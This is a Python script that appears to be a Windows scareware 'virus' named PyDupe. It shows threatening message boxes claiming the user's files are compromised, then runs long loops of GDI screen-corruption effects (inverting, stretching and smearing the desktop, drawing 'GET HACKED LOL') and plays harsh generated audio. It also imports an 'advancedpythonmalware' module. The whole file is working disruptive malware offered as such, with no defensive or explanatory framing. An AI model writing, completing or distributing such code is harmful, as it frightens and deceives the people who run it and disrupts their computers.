import time
import tkinter as tk
from tkinter import messagebox
import random
from win32api import *
from win32con import *
from win32gui import *
from ctypes import windll
import win32api
import win32con
import win32gui
import ctypes
import random
import time
import tkinter.messagebox as msg
import numpy as mp 
import sounddevice as sd
from threading import Thread
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import randint
import ctypes
import numpy as np
import sounddevice as sd
import time
from threading import Thread
from random import *
import winsound
import ctypes
import numpy as np
import sounddevice as sd
import random
import subprocess
import tkinter as tk
from tkinter import messagebox
import ctypes
import random
from win32api import GetSystemMetrics
from win32con import SRCCOPY
from win32gui import GetDC, GetDesktopWindow, StretchBlt
from time import sleep as Sleep
from win32api import GetSystemMetrics
import time
import ctypes
import math
import time
from ctypes import wintypes
import random
from concurrent.futures import ThreadPoolExecutor
import numpy as np
import sounddevice as sd
import winreg as wrg
import pyuac
import win32api
import win32con
import win32api
import advancedpythonmalware
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import random
from ctypes import wintypes
from concurrent.futures import ThreadPoolExecutor
import numpy as np


def show_message_box(message):
    messagebox.showinfo("ERROR", message)

# Create the main window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Show the first message box
show_message_box("Congratulations! You've just been fucked by the PyDupe virus. Consider this a digital handshake. Your files are now my playground, and your security is but a distant memory. No need to panic; I won't erase everything... yet. Just a friendly reminder that your defenses were not as good as you thought. Keep an eye on your digital life; you never know where I might pop up next. Best, PyDupe")
time.sleep(1.5)
# Show the second message box
show_message_box("Tick-tock, tick-tock. I hope you've enjoyed our little introduction. It's time to brace yourself for what comes next. My digital tendrils are spreading, and your files are dancing to my tune. You might want to double-check your security; it's about to glitch and groan under the pressure. This is your last chance to beef up those defenses because once the glitch hits, there's no turning back. Prepare yourself, PyDupe")

#add your additional code here
for _ in range(120):
    w, hdc = GetSystemMetrics(0), GetDC(0)
    text = "GET HACKED LOL"
    color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
    SetTextColor(hdc, color)
    SetBkMode(hdc, 0)
    x, y = random.randint(0, w), random.randint(0, w)
    ExtTextOut(hdc, x, y, 0, None, text, None)
    time.sleep(0.001)
    ReleaseDC(0, hdc)

show_message_box("you are such a loser -PyDupe")

time.sleep(1)

from pyaudio import PyAudio, paUInt8
import threading

pa = PyAudio()
audio = pa.open(
    format=paUInt8,
    channels=1,
    rate=8448,
    output=True
)

formula = 't<<2^t>>4^t<<4&t>>8|t<<1&-t>>4'

def play_audio():
    time = 0
    while True:
        values = []
        for _i in range(0x100):
            values.append(0xFF & eval(formula, {'t': time}))
            time += 1

        audio.write(bytes(values))

# Start playing audio in a separate thread
audio_thread = threading.Thread(target=play_audio)
audio_thread.daemon = True
audio_thread.start()

# Keep the main thread running indefinitely



for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
for _ in range(30):
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)
        time.sleep(0.004)
for _ in range(10):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)
        sw,sh = (GetSystemMetrics(0), GetSystemMetrics(1))
        HDC = GetDC(0)
        StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
        time.sleep(0.1)
        def screen_glitch(repeat_time, r, g, b):
            desk = GetDC(0)
            x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
            for i in range(repeat_time):
                brush = CreateSolidBrush(RGB(
                    r,
                    g,
                    b
                ))
                SelectObject(desk, brush)
                PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
                DeleteObject(brush)
                time.sleep(0.02)
            ReleaseDC(desk, GetDesktopWindow())
            DeleteDC(desk)
for _ in range(13):
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
        BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
        ReleaseDC(0, hdc)
for _ in range(13):
    def screen_glitch(repeat_time, r, g, b):
        desk = GetDC(0)
        x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
        for i in range(repeat_time):
            brush = CreateSolidBrush(RGB(
                r,
                g,
                b
            ))
            SelectObject(desk, brush)
            PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
            DeleteObject(brush)
            time.sleep(0.02)
        ReleaseDC(desk, GetDesktopWindow())
        DeleteDC(desk)
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)
        time.sleep(0.004)
for _ in range(55):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, -20, 0, w, h, hdc, 0, 0, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)

for _  in range(7):
            StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
            time.sleep(0.1)
            def screen_glitch(repeat_time, r, g, b):
                        desk = GetDC(0)
                        x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
                        for i in range(repeat_time):
                            brush = CreateSolidBrush(RGB(
                                r,
                                g,
                                b
                            ))
                            SelectObject(desk, brush)
                            PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
                            DeleteObject(brush)
                            time.sleep(0.02)
                        ReleaseDC(desk, GetDesktopWindow())
                        DeleteDC(desk)

for _ in range(40):
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)
        time.sleep(0.004)



user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
for _ in range(60):
    hdc = win32gui.GetDC(0)
    color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
    brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
    win32gui.SelectObject(hdc, brush)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)

for _ in range(5):
    desk = GetDC(0)
    x = GetSystemMetrics(0)
    y = GetSystemMetrics(1)
    #os.startfile('guiCorrupt.py')
    for i in range(50000):
        brush = CreateSolidBrush(RGB(
            randrange(255),
            randrange(255),
            randrange(255)
            )) #Creates a brush
        SelectObject(desk, brush) #Choose that we're drawing with our brush.
        PatBlt(desk, randrange(x), randrange(y), randrange(100), randrange(200), PATCOPY)
        DeleteObject(brush)
        #Sleep(1) #wait
    ReleaseDC(desk, GetDesktopWindow())
    DeleteDC(desk) #Deletes our DC.

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -20, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)
        time.sleep(0.002)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), w, h, hdc, 0, 0, SRCCOPY)
        BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-10, 10), random.randint(-10, 10), SRCCOPY)
        ReleaseDC(0, hdc)

for _ in range(8):
    advancedpythonmalware.GDI.screen_glitch(10, 255, 255, 255)

pa = PyAudio()
audio = pa.open(
    format=paUInt8,
    channels=1,
    rate=8448,
    output=True
)

formula = 't*(((t>>9)^((t>>9)-1)^1)%13)'

def play_audio():
    time = 0
    while True:
        values = []
        for _i in range(0x100):
            values.append(0xFF & eval(formula, {'t': time}))
            time += 1

        audio.write(bytes(values))

# Start playing audio in a separate thread
audio_thread = threading.Thread(target=play_audio)
audio_thread.daemon = True
audio_thread.start()



for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 10, 10, w, h, hdc, 0, 0, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, -20, 30, w, h, hdc, 10, 60, SRCCOPY)
        ReleaseDC(0, hdc)
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -20, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 10, 10, w, h, hdc, 0, 0, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, -20, 30, w, h, hdc, 10, 60, SRCCOPY)
        ReleaseDC(0, hdc)
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)

for _ in range(30):
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, -20, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
        ReleaseDC(0, hdc)
        desk = win32gui.GetDC(0)
        sw = win32api.GetSystemMetrics(0)
        sh = win32api.GetSystemMetrics(1)
        win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
        win32gui.ReleaseDC(0, desk)

for _ in range(30):
    hdc = win32gui.GetDC(0)
    x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
    y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
    w = win32api.GetSystemMetrics(0)
    h = win32api.GetSystemMetrics(1)
    win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
    time.sleep(0.01)
    win32gui.ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, random.randint(-500, 500), random.randint(-500, 500), w, h, hdc, random.randint(-500, 500), random.randint(-500, 500), SRCCOPY)
    ReleaseDC(0, hdc)
    w, hdc = GetSystemMetrics(0), GetDC(0)
    text = "your text here"
    color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
    SetTextColor(hdc, color)
    SetBkMode(hdc, 0)
    x, y = random.randint(0, w), random.randint(0, w)
    ExtTextOut(hdc, x, y, 0, None, text, None)
    time.sleep(0.001)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    color = RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    brush = CreateSolidBrush(color)
    x1, y1, x2, y2 = random.randint(0, w), random.randint(0, h), random.randint(0, w), random.randint(0, h)
    SelectObject(hdc, brush)
    Ellipse(hdc, x1, y1, x2, y2)
    DeleteObject(brush)
    time.sleep(0.01)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, random.randint(-300, 300), random.randint(-300, 300), w, h, hdc, 0, 0, SRCCOPY)
    BitBlt(hdc, 0, 0, w, h, hdc, random.randint(-300, 300), random.randint(-300, 300), SRCCOPY)
    ReleaseDC(0, hdc)
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, 10, 10, w, h, hdc, 0, 0, SRCCOPY)
    ReleaseDC(0, hdc)

for _ in range(30):
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    PatBlt(hdc, 0, 0, w, h, PATINVERT)
    time.sleep(0.01)
    ReleaseDC(0, hdc)
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
    time.sleep(0.1)
    def screen_glitch(repeat_time, r, g, b):
        desk = GetDC(0)
        x,y = (GetSystemMetrics(0), GetSystemMetrics(1))
        for i in range(repeat_time):
            brush = CreateSolidBrush(RGB(
                r,
                g,
                b
            ))
            SelectObject(desk, brush)
            PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
            DeleteObject(brush)
            time.sleep(0.02)
        ReleaseDC(desk, GetDesktopWindow())
        DeleteDC(desk)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 20, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 20, SRCCOPY)
        ReleaseDC(0, hdc)

user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)] 
hdc = win32gui.GetDC(0)
dx = dy = 1
angle = 0
size = 1
speed = 5

for _ in range(30):    
    win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, dx, dy, win32con.SRCCOPY)
    dx = math.ceil(math.sin(angle) * size * 10)
    dy = math.ceil(math.cos(angle) * size * 10)
    angle += speed / 10
    if angle > math.pi :
        angle = math.pi * -1

for _ in range(30):
    win32gui.DrawIcon(hdc, x , y , win32gui.LoadIcon(None, win32con.IDI_ERROR)) # Change IDI_ERROR to something else to change the icon being displayed
    x = x + 30
    if x >= w:
        y = y + 30
        x = 0
    if y >= h:
        x = y = 0
    
    desk = win32gui.GetDC(0)
    sw = win32api.GetSystemMetrics(0)
    sh = win32api.GetSystemMetrics(1)
    win32gui.StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, win32con.SRCCOPY)
    win32gui.ReleaseDC(0, desk)
    time.sleep(0.004)  # Sleep for 4 milliseconds

time.sleep(2)

pa = PyAudio()
audio = pa.open(
    format=paUInt8,
    channels=1,
    rate=8448,
    output=True
)

formula = 't*((t>>10|t%16*t>>8)&8*t>>12&18)'

def play_audio():
    time = 0
    while True:
        values = []
        for _i in range(0x100):
            values.append(0xFF & eval(formula, {'t': time}))
            time += 1

        audio.write(bytes(values))

# Start playing audio in a separate thread
audio_thread = threading.Thread(target=play_audio)
audio_thread.daemon = True
audio_thread.start()


for _ in range(30):
    w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
    BitBlt(hdc, 10, 10, w, h, hdc, 0, 0, SRCCOPY)
    ReleaseDC(0, hdc)
    hdc = win32gui.GetDC(0)
    color = (random.randint(0, 122), random.randint(0, 430), random.randint(0, 310))
    brush = win32gui.CreateSolidBrush(win32api.RGB(*color))
    win32gui.SelectObject(hdc, brush)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.SRCCOPY)
    win32gui.BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), sw, sh, hdc, 0, 0, win32con.PATINVERT)

for _ in range(30):
        w, hdc = GetSystemMetrics(0), GetDC(0)
        text = "skibidi toilet"
        color = random.randint(0, 255) | (random.randint(0, 255) << 8) | (random.randint(0, 255) << 16)
        SetTextColor(hdc, color)
        SetBkMode(hdc, 0)
        x, y = random.randint(0, w), random.randint(0, w)
        ExtTextOut(hdc, x, y, 0, None, text, None)
        time.sleep(0.001)
        ReleaseDC(0, hdc)
        hdc = win32gui.GetDC(0)
        win32gui.BitBlt(hdc, random.randint(0, 1), random.randint(0, 1), w, h, hdc, random.randint(0, 1), random.randint(0, 1), win32con.SRCAND)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 20, SRCCOPY)
        ReleaseDC(0, hdc)
        w, h, hdc = GetSystemMetrics(0), GetSystemMetrics(1), GetDC(0)
        hdcDest = CreateCompatibleDC(hdc)
        hBitmap = CreateCompatibleBitmap(hdc, w, h)
        SelectObject(hdcDest, hBitmap)
        hBrush = CreateSolidBrush(RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
        SelectObject(hdcDest, hBrush)
        Rectangle(hdcDest, 0, 0, w, h)
        BitBlt(hdc, 0, 0, w, h, hdcDest, 0, 0, SRCINVERT)
        DeleteObject(hBitmap)
        DeleteObject(hBrush)
        DeleteDC(hdcDest)
        ReleaseDC(0, hdc)
        hdc = win32gui.GetDC(0)
        x = win32api.GetSystemMetrics(win32con.SM_CXSCREEN)
        y = win32api.GetSystemMetrics(win32con.SM_CYSCREEN)
        w = win32api.GetSystemMetrics(0)
        h = win32api.GetSystemMetrics(1)
        win32gui.BitBlt(hdc, random.randint(0, 222), random.randint(0, 222), w, h, hdc, random.randint(0, 222), random.randint(0, 222), win32con.NOTSRCERASE)
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)

desk = GetDC(0)

w = GetSystemMetrics(0)
h = GetSystemMetrics(1)
a = GetSystemMetrics(SM_CXSCREEN)
b = GetSystemMetrics(SM_CYSCREEN)
sw = GetSystemMetrics(0)
sh = GetSystemMetrics(1)
x = GetSystemMetrics(0)
y = GetSystemMetrics(1)
xs = GetSystemMetrics(SM_CXSCREEN)
ys = GetSystemMetrics(SM_CYSCREEN)
i = 0
i < 1900



for _ in range(30):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)

for i in range(0,20):
    BitBlt(desk,10,10,w,h,desk,12,12,SRCAND)
    Sleep(300)

for i in range(0,4):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(0,20):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    DeleteObject(brush)

for i in range(0,5):
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
